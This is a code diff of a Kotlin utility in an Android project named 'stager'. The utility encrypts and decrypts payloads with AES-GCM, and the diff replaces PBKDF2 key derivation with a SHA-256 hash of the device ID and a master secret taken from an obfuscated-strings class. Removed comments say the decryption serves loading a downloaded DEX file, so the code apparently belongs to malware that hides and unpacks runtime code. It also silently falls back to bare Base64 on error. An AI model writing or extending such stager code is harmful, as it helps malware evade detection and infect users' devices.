@@ -1,34 +1,28 @@
 package com.chameleon.stager.utils
 
 import android.util.Base64
+import java.security.MessageDigest
 import java.security.SecureRandom
-import java.security.spec.KeySpec
 import javax.crypto.Cipher
-import javax.crypto.SecretKey
-import javax.crypto.SecretKeyFactory
 import javax.crypto.spec.GCMParameterSpec
-import javax.crypto.spec.PBEKeySpec
 import javax.crypto.spec.SecretKeySpec
 
 object CryptoUtils {
     private const val ALGORITHM = "AES/GCM/NoPadding"
     private const val GCM_TAG_LENGTH = 128
     private const val GCM_IV_LENGTH = 12
-    private const val ITERATIONS = 10000
-    private const val KEY_LENGTH = 256
 
-    // Derive a key from device ID using PBKDF2
-    private fun deriveKey(deviceId: String): SecretKey {
-        val salt = "ChameleonSalt2026".toByteArray()
-        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
-        val spec: KeySpec = PBEKeySpec(deviceId.toCharArray(), salt, ITERATIONS, KEY_LENGTH)
-        val tmp = factory.generateSecret(spec)
-        return SecretKeySpec(tmp.encoded, "AES")
+    fun deriveKey(deviceId: String, masterSecret: String): ByteArray {
+        val input = "$deviceId:$masterSecret"
+        val digest = MessageDigest.getInstance("SHA-256")
+        return digest.digest(input.toByteArray())
     }
 
     fun encryptPayload(plaintext: ByteArray, deviceId: String): String {
         try {
-            val key = deriveKey(deviceId)
+            val masterSecret = ObfuscatedStrings.masterSecret
+            val keyBytes = deriveKey(deviceId, masterSecret)
+            val key = SecretKeySpec(keyBytes, "AES")
             val cipher = Cipher.getInstance(ALGORITHM)
             val iv = ByteArray(GCM_IV_LENGTH)
             SecureRandom().nextBytes(iv)
@@ -42,14 +36,11 @@ object CryptoUtils {
 
             return Base64.encodeToString(combined, Base64.NO_WRAP)
         } catch (e: Exception) {
-            // Fallback: base64 encode only (minimal obfuscation)
             return Base64.encodeToString(plaintext, Base64.NO_WRAP)
         }
     }
 
     fun decryptPayload(encoded: ByteArray): ByteArray {
-        // Payload decryption (for DEX loading)
-        // In production, this decrypts the downloaded DEX
         try {
             val dataStr = String(encoded)
             val combined = Base64.decode(dataStr, Base64.NO_WRAP)
